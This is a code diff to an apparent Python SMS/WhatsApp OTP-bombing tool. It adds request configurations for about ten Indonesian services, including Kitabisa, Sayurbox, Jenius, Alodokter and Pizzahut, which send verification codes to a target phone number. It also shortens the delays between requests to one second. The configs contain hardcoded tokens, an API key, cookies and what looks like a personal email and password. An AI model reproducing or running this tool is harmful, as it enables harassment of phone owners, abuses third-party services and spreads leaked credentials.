@@ -223,29 +223,275 @@ API_CONFIGS = [
         "success_check": lambda response: response.status_code == 200
     },
     {
-    "name": "Maucash",
-    "method": "GET",
-    "url": "https://japi.maucash.id/welab-user/api/v1/send-sms-code",
-    "query_params": lambda phone: {
-        "mobile": phone,
-        "channelType": "0"
+        "name": "Maucash",
+        "method": "GET",
+        "url": "https://japi.maucash.id/welab-user/api/v1/send-sms-code",
+        "query_params": lambda phone: {
+            "mobile": phone,
+            "channelType": "0"
+        },
+        "headers": lambda: {
+            "Host": "japi.maucash.id",
+            "accept": "application/json, text/plain, */*",
+            "x-origin": "google play",
+            "x-org-id": "1",
+            "x-product-code": "YN-MAUCASH",
+            "x-app-version": "2.4.23",
+            "x-source-id": "android",
+            "accept-encoding": "gzip",
+            "Connection": "keep-alive",
+            "User-Agent": load_user_agent()  # Note: Original used 'okhttp/3.12.1' to mimic Android app
+        },
+        "data": None,
+        "success_check": lambda response: response.status_code == 200
     },
+    {
+        "name": "AltBalaji",
+        "method": "POST",
+        "url": "https://api.cloud.altbalaji.com/accounts/mobile/verify?domain=ID",
+        "query_params": None,
+        "headers": lambda: {
+            "Accept": "application/json, text/plain, */*",
+            "Origin": "https://lite.altbalaji.com",
+            "Save-Data": "on",
+            "User-Agent": load_user_agent(),
+            "Content-Type": "application/json;charset=UTF-8",
+            "Referer": "https://lite.altbalaji.com/subscribe?progress=input",
+            "Accept-Encoding": "gzip, deflate, br",
+            "Accept-Language": "en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6",
+            "Connection": "keep-alive"
+        },
+        "data": lambda phone: {
+            "country_code": "62",
+            "phone_number": phone
+        },
+        "success_check": lambda response: response.json().get("status") == "ok",
+    },
+    {
+        "name": "TokoTalk",
+        "method": "POST",
+        "url": "https://api.tokotalk.com/v1/no_auth/verifications",
+        "query_params": None,
+        "headers": lambda: {
+            "User-Agent": load_user_agent(),
+            "content-type": "application/json;charset=UTF-8",
+            "Connection": "keep-alive"
+        },
+        "data": lambda phone: {
+            "key": "phone",
+            "value": phone
+        },
+        "success_check": lambda response: "expireAt" in response.text
+    },
+    {
+        "name": "Kitabisa",
+        "method": "GET",
+        "url": lambda phone: f"https://core.ktbs.io/v2/user/registration/otp/{phone}",
+        "query_params": None,
+        "headers": lambda: {
+            "User-Agent": load_user_agent(),
+            "Accept-Encoding": "gzip, deflate",
+            "Connection": "keep-alive"
+        },
+        "data": None,
+        "success_check": lambda response: response.status_code == 200
+    },
+    {
+    "name": "Sayurbox",
+    "method": "POST",
+    "url": "https://www.sayurbox.com/graphql/v1?deduplicate=1",
+    "query_params": None,
     "headers": lambda: {
-        "Host": "japi.maucash.id",
-        "accept": "application/json, text/plain, */*",
-        "x-origin": "google play",
-        "x-org-id": "1",
-        "x-product-code": "YN-MAUCASH",
-        "x-app-version": "2.4.23",
-        "x-source-id": "android",
-        "accept-encoding": "gzip",
-        "Connection": "keep-alive",
-        "User-Agent": load_user_agent()  # Note: Original used 'okhttp/3.12.1' to mimic Android app
+        "Host": "www.sayurbox.com",
+        "content-length": "289",
+        "sec-ch-ua-mobile": "?1",
+        "authorization": "eyJhbGciOiJSUzI1NiIsImtpZCI6ImY4NDY2MjEyMTQxMjQ4NzUxOWJiZjhlYWQ4ZGZiYjM3ODYwMjk5ZDciLCJ0eXAiOiJKV1QifQ.eyJhbm9ueW1vdXMiOnRydWUsImF1ZCI6InNheXVyYm94LWF1ZGllbmNlIiwiYXV0aF90aW1lIjoxNjYyNjQwMTA4LCJleHAiOjE2NjUyMzIxMDgsImlhdCI6MTY2MjY0MDEwOCwiaXNzIjoiaHR0cHM6Ly93d3cuc2F5dXJib3guY29tIiwibWV0YWRhdGEiOnsiZGV2aWNlX2luZm8iOm51bGx9LCJuYW1lIjpudWxsLCJwaWN0dXJlIjpudWxsLCJwcm92aWRlcl9pZCI6ImFub255bW91cyIsInNpZCI6ImIwYjc1ZjI1LTllZmYtNDJjNS1hNmJiLWMyYjA3ZGI2YjVkOSIsInN1YiI6IllsNzB5YmtVWFl1dmstU3BTbkQ0ODlWX3NGOTIiLCJ1c2VyX2lkIjoiWWw3MHlia1VYWXV2ay1TcFNuRDQ4OVZfc0Y5MiJ9.DCYJRFjl-TTezyjXba-XLOOUK2ppvNBL--ETojGa_UauO0zyaaD090eFaMpglVThj-y3fbFany9eT1qx5y1olulqTGxExI1DsIVN8_Ds6cQuTPaYsBKFwgHZQSnKRkRAP3aEILhzRMsUUG7kwBJWCziTC9nGfBWl7tPwHoYmnerOzsSnTUjCnOfDphMuj_glxHsKDPtIUwie2xi00d0NhMDnc2kyrkJc8xer7XLXWJGzZVvI-3wl72VLcB1GmDVZKo-JX9tAhzO7lsGSXm9G0lSYKD_NUUMKbU7d4w_2Col3Lhu6E0ltyw4nmna8ssc0q8_ti1b9F-HL1GfRzTRa-g",
+        "content-type": "application/json",
+        "accept": "*/*",
+        "x-bundle-revision": "6.0",
+        "x-sbox-tenant": "sayurbox",
+        "x-binary-version": "2.2.1",
+        "user-agent": "Mozilla/5.0 (Linux; Android 9; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36",
+        "sec-ch-ua-platform": "Android",
+        "origin": "https://www.sayurbox.com",
+        "sec-fetch-site": "same-origin",
+        "sec-fetch-mode": "cors",
+        "sec-fetch-dest": "empty",
+        "accept-encoding": "gzip, deflate, br",
+        "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
     },
-    "data": None,
-    "success_check": lambda response: response.status_code == 200
+    "data": lambda phone: {
+        "operationName": "generateOTP",
+        "variables": {
+            "destinationType": "whatsapp",
+            "identity": "+62" + phone.lstrip("0")
+        },
+        "query": "mutation generateOTP($destinationType: String!, $identity: String!) {\n  generateOTP(destinationType: $destinationType, identity: $identity) {\n    id\n    __typename\n  }\n}"
     },
-    # Add more API configs here
+    "success_check": lambda response: "generateOTP" in response.text
+    },
+    {
+        "name": "Tokko",
+        "method": "POST",
+        "url": "https://api.tokko.io/graphql",
+        "query_params": None,
+        "headers": lambda: {
+            "Host": "api.tokko.io",
+            "content-length": "306",
+            "accept-language": "id",
+            "sec-ch-ua-mobile": "?1",
+            "user-agent": "Mozilla/5.0 (Linux; Android 9; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36",
+            "x-tokko-api-client": "merchant_web",
+            "content-type": "application/json",
+            "accept": "*/*",
+            "x-tokko-api-client-version": "4.5.1",
+            "sec-ch-ua-platform": "Android",
+            "origin": "https://web.lummoshop.com",
+            "sec-fetch-site": "cross-site",
+            "sec-fetch-mode": "cors",
+            "sec-fetch-dest": "empty",
+            "referer": "https://web.lummoshop.com/",
+            "accept-encoding": "gzip, deflate, br"
+        },
+        "data": lambda phone: {
+            "operationName": "generateOTP",
+            "variables": {
+                "generateOtpInput": {
+                    "phoneNumber": "+62" + phone.lstrip("0"),
+                    "hashCode": "",
+                    "channel": "WHATSAPP",
+                    "userType": "MERCHANT"
+                }
+            },
+            "query": "mutation generateOTP($generateOtpInput: GenerateOtpInput!) {\n  generateOtp(generateOtpInput: $generateOtpInput) {\n    phoneNumber\n  }\n}\n"
+        },
+        "success_check": lambda response: "generateOtp" in response.text
+    },
+    {
+        "name": "Carsome",
+        "method": "POST",
+        "url": "https://www.carsome.id/website/login/sendSMS",
+        "query_params": None,
+        "headers": lambda: {
+            "Host": "www.carsome.id",
+            "content-length": "38",
+            "x-language": "id",
+            "sec-ch-ua-mobile": "?1",
+            "user-agent": "Mozilla/5.0 (Linux; Android 9; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36",
+            "content-type": "application/json",
+            "accept": "application/json, text/plain, */*",
+            "country": "ID",
+            "x-amplitude-device-id": "A4p3vs1Ixu9wp3wFmCEG9K",
+            "sec-ch-ua-platform": "Android",
+            "origin": "https://www.carsome.id",
+            "sec-fetch-site": "same-origin",
+            "sec-fetch-mode": "cors",
+            "sec-fetch-dest": "empty",
+            "referer": "https://www.carsome.id/",
+            "accept-encoding": "gzip, deflate, br",
+            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
+        },
+        "data": lambda phone: {
+            "username": phone,
+            "optType": 1
+        },
+        "success_check": lambda response: response.status_code == 200
+    },
+    {
+        "name": "Jenius",
+        "method": "POST",
+        "url": "https://api.btpn.com/jenius",
+        "query_params": None,
+        "headers": lambda: {
+            "accept": "*/*",
+            "btpn-apikey": "f73eb34d-5bf3-42c5-b76e-271448c2e87d",
+            "version": "2.36.1-7565",
+            "accept-language": "id",
+            "x-request-id": "d7ba0ec4-ebad-4afd-ab12-62ce331379be",
+            "Content-Type": "application/json",
+            "Host": "api.btpn.com",
+            "Connection": "Keep-Alive",
+            "Accept-Encoding": "gzip",
+            "Cookie": "c6bc80518877dd97cd71fa6f90ea6a0a=24058b87eb5dac1ac1744de9babd1607",
+            "User-Agent": "okhttp/3.12.1"
+        },
+        "data": lambda phone: {
+            "query": "mutation registerPhone($phone: String!,$language: Language!) {\n  registerPhone(input: {phone: $phone,language: $language}) {\n    authId\n    tokenId\n    __typename\n  }\n}\n",
+            "variables": {
+                "phone": "+62" + phone.lstrip("0"),
+                "language": "id"
+            },
+            "operationName": "registerPhone"
+        },
+        "success_check": lambda response: "registerPhone" in response.text
+    },
+    {
+        "name": "Alodokter",
+        "method": "POST",
+        "url": "https://www.alodokter.com/login-with-phone-number",
+        "query_params": None,
+        "headers": lambda: {
+            "Host": "www.alodokter.com",
+            "content-length": "33",
+            "x-csrf-token": "UG8hv2kV0R2CatKLXYPzT1isPZuGHVJi8sjnubFFdU1YvsHKrmIyRz6itHgNYuuBbbgSsCmfJWktrsfSC9SaGA==",
+            "sec-ch-ua-mobile": "?1",
+            "user-agent": "Mozilla/5.0 (Linux; Android 11; vivo 2007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36",
+            "content-type": "application/json",
+            "accept": "application/json",
+            "save-data": "on",
+            "origin": "https://www.alodokter.com",
+            "sec-fetch-site": "same-origin",
+            "sec-fetch-mode": "cors",
+            "sec-fetch-dest": "empty",
+            "referer": "https://www.alodokter.com/login-alodokter",
+            "accept-encoding": "gzip, deflate, br",
+            "accept-language": "id-ID,id;q=0.9,en;q=0.8"
+        },
+        "data": lambda phone: {
+            "user": {
+                "phone": "0" + phone.lstrip("0")
+            }
+        },
+        "success_check": lambda response: response.status_code == 200
+    },
+    {
+        "name": "Pizzahut",
+        "method": "POST",
+        "url": "https://api-prod.pizzahut.co.id/customer/v1/customer/register",
+        "query_params": None,
+        "headers": lambda: {
+            "Host": "api-prod.pizzahut.co.id",
+            "content-length": "157",
+            "x-device-type": "PC",
+            "sec-ch-ua-mobile": "?1",
+            "x-platform": "WEBMOBILE",
+            "x-channel": "2",
+            "content-type": "application/json;charset=UTF-8",
+            "accept": "application/json",
+            "x-client-id": "b39773b0-435b-4f41-80e9-163eef20e0ab",
+            "user-agent": "Mozilla/5.0 (Linux; Android 11; vivo 2007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36",
+            "x-lang": "en",
+            "save-data": "on",
+            "x-device-id": "web",
+            "origin": "https://www.pizzahut.co.id",
+            "sec-fetch-site": "same-site",
+            "sec-fetch-mode": "cors",
+            "sec-fetch-dest": "empty",
+            "referer": "https://www.pizzahut.co.id/",
+            "accept-encoding": "gzip, deflate, br",
+            "accept-language": "id-ID,id;q=0.9,en;q=0.8"
+        },
+        "data": lambda phone: {
+            "email": "aldigg088@gmail.com",
+            "first_name": "Xenzi",
+            "last_name": "Wokwokw",
+            "password": "Aldi++\\/67",
+            "phone": "0" + phone.lstrip("0"),
+            "birthday": "2000-01-02"
+        },
+        "success_check": lambda response: response.status_code == 200
+    },
+        # Add more API configs here
 ]
 
 def autoketik(message: str) -> None:
@@ -351,11 +597,11 @@ def spam_phone_number(phone: str, repeat: bool = False) -> None:
             autoketik(f"{GREEN}Successfully sent {config['name']} request{RESET}")
         else:
             autoketik(f"{RED}Failed to send {config['name']} request{RESET}")
-        countdown(120)  # Configurable delay
+        countdown(1)  # Configurable delay
 
     if repeat:
         autoketik(f"{YELLOW}Rebooting in 20 seconds...{RESET}")
-        time.sleep(15)
+        time.sleep(1)
         spam_phone_number(phone, repeat=True)
 
 def get_user_input() -> Tuple[str, bool]:
